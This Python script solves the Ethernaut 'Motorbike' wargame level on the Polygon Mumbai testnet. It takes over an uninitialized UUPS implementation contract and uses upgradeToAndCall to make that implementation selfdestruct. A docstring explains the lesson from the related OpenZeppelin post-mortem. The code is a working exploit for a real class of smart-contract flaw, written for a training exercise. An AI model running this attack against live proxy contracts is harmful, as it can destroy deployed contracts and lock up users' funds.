
from web3 import Web3
from web3.middleware import geth_poa_middleware
from eth_utils import remove_0x_prefix, to_hex, to_checksum_address, to_bytes
import os
import json
from eth_abi import abi
from eth_abi import encode
import numpy as np

'''
SUCCESS MESSAGE:

The advantage of following an UUPS pattern is to have very minimal proxy to be deployed. 
The proxy acts as storage layer so any state modification in the implementation contract normally doesn't produce side effects to systems using it, 
since only the logic is used through delegatecalls.

This doesn't mean that you shouldn't watch out for vulnerabilities that can be exploited if we leave an implementation contract uninitialized.

This was a slightly simplified version of what has really been discovered after months of the release of UUPS pattern.

Takeways: never leave implementation contracts uninitialized ;)

If you're interested in what happened, read more here. [https://forum.openzeppelin.com/t/uupsupgradeable-vulnerability-post-mortem/15680]
'''

class Motorbike():
    def __init__(self):
        
        # read sensitive data from file
        curr_path = os.path.dirname(os.path.abspath(__file__)) + '/'
        try:
            with open(curr_path + '../secret.json') as json_file:
                self.secret_json = json.load(json_file)
        except:
            print('secret.json missing')
            exit()

        # init web3
        alchemy_url = "https://polygon-mumbai.g.alchemy.com/v2/" + self.secret_json['alpchemy']['api_key']
        self.w3 = Web3(Web3.HTTPProvider(alchemy_url))
        self.w3.middleware_onion.inject(geth_poa_middleware, layer=0)
        assert self.w3.is_connected()

        # get implementation address
        impl_contract_address = self.get_upgradeable_proxy_implementation(self.secret_json['25_motorbike_addr'])
        motorbike_impl_addr = self.w3.to_checksum_address(remove_0x_prefix(impl_contract_address)[(32-20)*2:])
        print(f'implementation address = {motorbike_impl_addr}')

        # call proxy contract
        _func = 'upgrader()'
        _owner = self.call_custom_function(_func)
        print(f'{_func} == {_owner}')

        # initialize implementation direct call
        if 0:
            function_signature_init = self.w3.keccak(text=f'initialize()').hex()[:10]
            _txn = self.get_mumbai_polygon_empty_tx()
            _txn.update({
                'to': motorbike_impl_addr,
                'from': self.secret_json['my_addr'],
                'data': function_signature_init
            })
            print(f'initialize implementation', self.sign_and_send_tx(_txn))
        
        # suicide engine created,
        # call selfdestruct though upgradeToAndCall of motorbike_impl_addr after ownership taken with initialize()
        function_signature_upgradeToAndCall = self.w3.keccak(text=f'upgradeToAndCall(address,bytes)').hex()[:10]
        function_signature_destroy = self.w3.keccak(text=f'destroy()').hex()[:10]
        function_signature_upgradeToAndCall_args = remove_0x_prefix(to_hex(encode(['address','bytes'], [self.secret_json['25_motorbike_suicide_engine_addr'], to_bytes(hexstr=function_signature_destroy)])))
        _txn = self.get_mumbai_polygon_empty_tx()
        _txn.update({
            'to': motorbike_impl_addr,
            'from': self.secret_json['my_addr'],
            'data': function_signature_upgradeToAndCall + function_signature_upgradeToAndCall_args
        })
        print('self desctruct engine', self.sign_and_send_tx(_txn))

    def sign_and_send_tx(self, _txn):
        # sign the transaction
        signed_tx = self.w3.eth.account.sign_transaction(_txn, self.secret_json['my_addr_private_key'])
        # send transaction
        tx_hash = self.w3.eth.send_raw_transaction(signed_tx.rawTransaction)
        # get transaction hash
        print(f'tx_hash = {self.w3.to_hex(tx_hash)}')
        # wait for the transaction to be mined and get the transaction receipt
        tx_receipt = self.w3.eth.wait_for_transaction_receipt(tx_hash)
        if tx_receipt['status']:
            print('tx succeeded')
            return True
        else:
            print('tx failed')
        return False
    
    def call_custom_function(self, _func, _data = ''):
        # make interaction with proxy contract, calling view-only function
        response = self.w3.eth.call({
            'to': self.secret_json['25_motorbike_addr'],
            'from': self.secret_json['my_addr'],
            'data': self.w3.keccak(text=_func).hex()[:10] + _data
        })
        # Decode the response, if necessary
        return self.w3.to_hex(response)
    
    def get_upgradeable_proxy_implementation(self,
                                             addr,
                                             _IMPLEMENTATION_SLOT = '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc'):
        impl_contract = self.w3.to_hex(
            self.w3.eth.get_storage_at(self.w3.to_checksum_address(addr), _IMPLEMENTATION_SLOT))
        return impl_contract
    
    def get_mumbai_polygon_empty_tx(self):
        return {
            'nonce': self.w3.eth.get_transaction_count(self.secret_json['my_addr']),
            'gas': 3000000,
            'gasPrice': self.w3.to_wei('50', 'gwei'),
            'chainId': 80001    #  mumbai-polygon
        }
    
if __name__ == '__main__':
    va = Motorbike()
